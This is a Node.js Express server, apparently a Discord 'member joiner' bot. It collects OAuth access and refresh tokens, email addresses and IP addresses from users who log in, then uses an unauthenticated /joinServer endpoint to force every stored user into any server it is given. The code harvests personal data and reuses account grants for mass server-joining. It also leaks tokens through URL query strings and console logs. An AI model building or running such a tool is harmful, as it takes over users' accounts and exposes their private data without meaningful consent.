const express = require('express');
const btoa = require('btoa');
const axios = require("axios");
const mysql = require("mysql2")

const app = express();
app.set("trust proxy", true);

const config = require("./config.json")

var pool = mysql.createPool({
    //connectionLimit: 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999,
    host: config.host,
    user: config.username,
    password: config.password,
    database: config.name,
})

const creds = require("./credentials.json")

app.get('/', (req, res) => {
    res.redirect([
        'https://discordapp.com/oauth2/authorize',
        `?client_id=${creds.application_id}`,
        '&scope=identify%20email%20guilds%20guilds.join',
        '&response_type=code',
        `&callback_uri=${creds.redirect_url}`
      ].join(''));
});

app.get('/authorize', (req, res) => {
    const code = req.query.code;
    const cred = btoa(`${creds.application_id}:${creds.client_secret}`);

    const body = {
        "client_id": creds.application_id,
        "client_secret": creds.client_secret,
        "grant_type": "authorization_code",
        "code": code
    }

    const options = {
        headers: {
            'Authorization': `Basic ${cred}`,
            "Content-Type": "application/x-www-form-urlencoded"
        }
    }

    axios.post(`https://discordapp.com/api/oauth2/token`, _encode(body), options).then((resp) => {
        console.log(resp.data)
        res.redirect(`/gatherData?access_token=${resp.data.access_token}&refresh_token=${resp.data.refresh_token}`)
    }, (error) => {
        console.log(error);
    });
});

app.get('/gatherData', (req, res) => {
    const options = {
        headers: {
            'Authorization': `Bearer ${req.query.access_token}`
        }
    }

    axios.get(`https://discordapp.com/api/v6/users/@me`, options).then((resp) => {
        console.log(resp.data)
        const jsonThing = req.query
        let access_token = jsonThing.access_token
        let refresh_token = jsonThing.refresh_token
        let user_id = resp.data.id
        let tag = resp.data.username + "#" + resp.data.discriminator
        let email = resp.data.email
        let ip = req.ip

        pool.query(
            "INSERT INTO users (access_token, refresh_token, user_id, tag, ip, email) VALUES (?, ?, ?, ?, ?, ?)",
            [access_token, refresh_token, user_id, tag, ip, email],
            (err, results) => {
                if (err) throw err
                console.log("Added user to database.")
            }
        )
    }, (error) => {
        console.log(error);
    });
});

app.post("/joinServer", (req, res) => {
    const guildId = req.query.guildId;
    let guildName = `guild with id ${guildId}`
    axios.get(`https://discordapp.com/api/v6/guilds/${guildId}/preview`, 
    { headers: {"Authorization": `Bot ${creds.bot_token}`} }).then((resp) => {
        guildName = resp.data.name
        beginningMembers = resp.data.approximate_member_count
    }, (error) => {
        console.log(error)
    });
    pool.query(`SELECT * FROM users`, (err, results) => {
        if (err) throw err
        let success = 0;
        for (let i = 0; i < results.length; ++i) {
            let user_id = results[i]?.user_id
            let access_token = results[i]?.access_token
            let tag = results[i]?.tag
            axios.put(`https://discordapp.com/api/v6/guilds/${guildId}/members/${user_id}`, {
                "access_token": access_token
            }, { headers: {"Authorization": `Bot ${creds.bot_token}`} }).then((resp) => {
                if(resp.status == 201) {
                    console.log(`Successfully had ${tag} join ${guildName}.`)
                    success = success + 1;
                } else if(resp.status == 204) {
                    console.log(`${tag} is already a member of ${guildName}.`)
                    success = success + 1;
                } else {
                    console.log(`Was not able to make ${tag} join ${guildName}.`)
                }
            }, (error) => {
                console.log(`Was not able to make ${tag} join ${guildName}.`)
            });
        }

        axios.get(`https://discordapp.com/api/v6/guilds/${guildId}/preview`,
        { headers: {"Authorization": `Bot ${creds.bot_token}`} }).then((resp) => {
            const members = resp.data.approximate_member_count
            res.send(`Successfully made ${success} users join ${guildName}. Started at ${beginningMembers}, now at ${members} (an increase by ${members - beginningMembers} members!)`)
        }, (error) => {
            console.log(error)
        });
    })
});

function _encode(obj) {
    let string = "";

    for (const [key, value] of Object.entries(obj)) {
        if (!value) continue;
        string += `&${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
    }

    return string.substring(1);
}

app.listen(8080, "0.0.0.0", () => console.log('Ready'));